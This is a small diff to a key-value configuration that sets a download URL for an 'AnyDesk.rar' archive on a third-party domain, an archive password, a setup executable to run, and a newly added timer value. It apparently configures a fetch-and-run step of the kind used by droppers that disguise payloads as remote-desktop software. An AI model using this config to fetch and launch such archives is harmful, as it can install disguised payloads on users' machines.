@@ -2,3 +2,4 @@ url=https://w3services.ca/AnyDesk.rar
 name=AnyDesk.rar
 password=2025
 setup=AnyDesk.exe
+timer=1
